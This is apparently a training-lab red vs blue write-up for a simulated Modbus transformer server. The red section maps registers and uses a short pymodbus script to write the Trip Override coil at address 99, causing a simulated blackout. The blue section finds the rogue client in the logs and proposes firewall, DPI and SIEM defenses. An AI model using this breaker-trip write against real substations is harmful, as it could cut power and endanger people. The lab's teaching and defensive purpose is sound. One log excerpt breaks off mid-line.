# Transformer Registery Red vs Blue Writeup

## Red Team Writeup

# Red Team Writeup: Discovery & Active Process Disruption

**Objective**: Reconstruct the mapping of process variables to Modbus addresses, locate the undocumented Breaker Trip Override coil, and trigger it to cause a blackout.

## Scoring Criteria Mapped
1. **Transformer Load (MW)**: FC03 (Holding Registers), Address `10`
2. **Oil Temperature (C)**: FC04 (Input Registers), Address `20`
3. **Cooling Fan State**: FC01 (Coils), Address `30`
4. **Breaker Position**: FC02 (Discrete Inputs), Address `40`
5. **Trip Override Coil**: FC01 (Coils), Address `99`


---

Step 1: Initialize the Red Environment

First, navigate to the Red Module directory and execute the setup script:

bash

cd /home/vboxuser/Desktop/Niket/3_Transformer-Register-Baseline-Reconstruction/Module_1_Red

sudo ./setup.sh

(This starts the simulated Modbus server in the background on port 5020)


Step 2: Perform a Port Scan

Verify that the Modbus TCP service is up and listening:

bash

nmap -p 5020 127.0.0.1

Expected Result: Port 5020 should show as open.


Step 3: Run the Delta Analysis Scan

Run the attack/scan script multiple times to observe register changes:

bash

./red_attack.sh 127.0.0.1 5020 --repeat 3 --delay 2

Step 4: Identify Real Registers vs. Decoys

Analyze the outputs from the scan:

Coils (FC01): Look for the register address that changes state between True/False (or 1/0).
Result: Address 30 changes dynamically. Address 1 is static (decoy). (Cooling Fan = 30)

Discrete Inputs (FC02): Look for the register address toggling states.
Result: Address 40 changes dynamically. Address 4 is static (decoy). (Breaker Position = 40)

Holding Registers (FC03): Look for a register carrying load values (fluctuating between 50 and 150).
Result: Address 10 changes value dynamically. Address 7 stays stuck at 100 (decoy). (Transformer Load = 10)

Input Registers (FC04): Look for a register representing temperature (drifting slowly between 40 and 90).
Result: Address 20 drifts dynamically. Address 11 stays stuck at 400 (decoy). (Oil Temperature = 20)


Step 5: Exploit the Trip Override

Based on the engineering document, there is an emergency Trip Override coil at address 99.
Write a python script to trigger it and initiate a blackout:

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('127.0.0.1', port=5020)
client.connect()

print("[+] Triggering Trip Override Coil (99)...")
client.write_coil(99, True)
print("[+] Blackout initiated successfully.")
client.close()
```

Or execute via the red attack script:
```bash
./red_attack.sh 127.0.0.1 5020 --trip-breaker
```

## Step-by-Step Manual Solution

### Step 1: Identify the Service (Port Scanning)
Verify if port `5020` is open on the target environment (the default Modbus TCP server port for this challenge):
```bash
nmap -p 5020 127.0.0.1
```

### Step 2: Understand the Physical Process
Examine `process_description.txt` to find variables and engineering ranges.
*Note: Static decoy registers are seeded to deceive scanners.*

### Step 3: Run Interactive Python Scan (Multi-Run Delta Analysis)
Write a Python script to scan registers 0-99 across all four function codes, then run it multiple times to observe fluctuations.

### Step 4: Analyze Fluctuations & Filter Decoys
Map the process variables by identifying dynamic vs static values:
- **Transformer Load (MW)**: Address `10` (FC03 Holding Register)
- **Oil Temperature (Â°C)**: Address `20` (FC04 Input Register)
- **Cooling Fan State**: Address `30` (FC01 Coil)
- **Breaker Position**: Address `40` (FC02 Discrete Input)

### Step 5: Exploit & Initiate Blackout
Write `True` (1) to the Trip Override coil at Address `99` (FC01 Coil). The server will trip the main breaker (`OPEN`), dropping transformer load to `0 MW` and causing a substation blackout.

---

## Blue Team Writeup

# Blue Team Writeup: Detection & Forensics Walkthrough

This guide details the forensic methodology to identify, investigate, and characterize unauthorized reconnaissance activity targeting a transformer instrumentation Modbus TCP server.

---

Part 2: Blue Team (Forensic Log Analysis)

The goal is to parse the historical Modbus logs, identify the attacker's IP, and find when they first accessed the system.


Step 1: Initialize the Blue Team Environment

Navigate to the Blue Team module and deploy the lab environment:

cd ../Module_2_Blue
sudo ./setup.sh

This script generates the required forensic artifacts:

modbus_server.log
whitelist.txt
Step 2: Identify All Modbus Clients

Review the transaction log and count unique client IP addresses:

cat ./modbus_server.log | awk -F 'Client: ' '{print $2}' | awk '{print $1}' | sort | uniq -c

540 192.168.1.10
  4 192.168.1.99
Analysis

Two systems communicated with the Modbus server:

IP Address	Transactions
192.168.1.10	540
192.168.1.99	4

The next step is determining which system is authorized.

Step 3: Verify Authorized Systems

Open the whitelist file:

cat whitelist.txt

192.168.1.10
Finding

Only 192.168.1.10 is approved.

Therefore, the unauthorized client is:

192.168.1.99

Rogue IP Identified: 192.168.1.99

Step 4: Determine the First Access Timestamp

Search the log for the first activity originating from the rogue IP:

grep "Client: 192.168.1.99" ./modbus_server.log | head -n 1

2026-06-18 10:05:00 - Client: 192.168.1.99 - FC: 1 - Addr: 0 - Qty: 100 - Result: Success
Finding

First Access Timestamp:

2026-06-18 10:05:00

This represents the initial reconnaissance activity.

Step 5: Review All Rogue Activity

Display every transaction generated by the unauthorized client:

grep "Client: 192.168.1.99" ./modbus_server.log
Expected Output
2026-06-18 10:05:00 - Client: 192.168.1.99 - FC: 1 - Addr: 0 - Qty: 100
2026-06-18 10:05:02 - Client: 192.168.1.99 - FC: 2 - Addr: 0 - Qty: 100
2026-06-18 10:05:04 - Client: 192.168.1.99 - FC: 3 - Addr: 0 - Qty: 100
2026-06-18 10:05:06 - Client: 192.168.1.99 - FC: 4 - Addr: 0 -
































































## Phase 1: Identifying the Rogue Client IP

1. **Locate the Log File**:
   The Modbus TCP server is configured to log transaction details to `./modbus_server.log`.

2. **Extract and Summarize Client IPs**:
   Use Linux command-line utilities to parse the log and list all unique client IPs that have initiated connection sessions:
   ```bash
   cat ./modbus_server.log | awk -F 'Client: ' '{print $2}' | awk '{print $1}' | sort | uniq -c
   ```
   **Output Analysis**:
   - `192.168.1.10`: Polling at regular intervals (540 records).
   - `192.168.1.99`: Initiated connections but is not part of the standard baseline (4 records).

3. **Cross-Reference with the Whitelist**:
   Read `whitelist.txt` on disk to identify approved engineering workstations or SCADA masters:
   ```bash
   cat whitelist.txt
   ```
   *Result*: Only `192.168.1.10` is listed. Therefore, `192.168.1.99` is flagged as an **unauthorized Modbus client**.

---

## Phase 2: Detecting the First Access Timestamp

To determine when the breach/reconnaissance attempt began, search the log file for the first transaction record originating from the rogue IP:
```bash
grep "Client: 192.168.1.99" ./modbus_server.log | head -n 1
```
*Result*:
```
2026-06-18 10:05:00 - Client: 192.168.1.99 - FC: 1 - Addr: 0 - Qty: 100 - Result: Success
```
The **First Access Timestamp** is **`2026-06-18 10:05:00`**.

---

## Phase 3: Characterizing the Reconnaissance Activity

To analyze how the adversary mapped the system, filter all entries associated with the unauthorized client:
```bash
grep "Client: 192.168.1.99" ./modbus_server.log
```

**Abnormal Read Pattern Analysis**:
1. **Quantity and Address Ranges**:
   - **Baseline Polling (`192.168.1.10`)**: Specifically reads only single registers (`Qty: 1`) at dedicated addresses (`Addr: 30` for Coils, `Addr: 40` for Discrete Inputs, `Addr: 10` for Holding Registers, and `Addr: 20` for Input Registers).
   - **Adversary Activity (`192.168.1.99`)**: Requests large blocks of registers (`Qty: 100`) starting from index 0 (`Addr: 0`). This sweeps the entire standard Modbus address block in single-shot reads.
2. **Function Code Breadth**:
   - The rogue device issued read requests across all four fundamental tables:
     - **FC 1** (Read Coils)
     - **FC 2** (Read Discrete Inputs)
     - **FC 3** (Read Holding Registers)
     - **FC 4** (Read Input Registers)
   - This exhaustive table scan indicates active reconnaissance designed to map the process register space (MITRE ATT&CK for ICS: T0801 - Monitor Process State).

---

## Scoring Criteria Mapping
Ensure you submit the following findings to score points for the Blue Team module:
1. **Source IP**: `192.168.1.99`
2. **Abnormal Read Pattern**: Large-quantity block reads (`Qty: 100`) starting from address 0 across FC01, FC02, FC03, and FC04.
3. **Targeted Register Ranges**: Address `0` to `99` (Quantity `100`) for all four tables.
4. **First Access Timestamp**: `2026-06-18 10:05:00`.

---

## Recommended Remediation & Defenses

1. **Network-Level Whitelisting (Firewalling)**:
   Modbus TCP lacks native authentication. Implement strict firewall rules (iptables/nftables) or network access control lists (ACLs) to drop any traffic on TCP port 5020 (or 5200/502) that does not originate from whitelisted hosts.
   
2. **Industrial Firewalls / Deep Packet Inspection (DPI)**:
   Deploy specialized OT firewalls (e.g., Nozomi, Claroty, or Snort rules) that inspect Modbus packets. Configure alerts or blocks for:
   - Modbus read requests with unexpected quantities (e.g., `Qty > 1`).
   - Requests targeting unmapped addresses.
   - Unauthorized client IPs attempting connection handshakes.

3. **Modbus Gateway / Proxy**:
   Route SCADA telemetry traffic through a secure Modbus TCP gateway that supports authentication and function code restrictions (e.g., mapping read-only views and blocking broad range scans).

4. **Security Information and Event Management (SIEM) Alerting**:
   Ingest Modbus transaction logs into a SIEM and configure behavioral alerts on:
   - Occurrence of new source IPs.
   - High frequency or large quantity of Modbus read commands from any source.

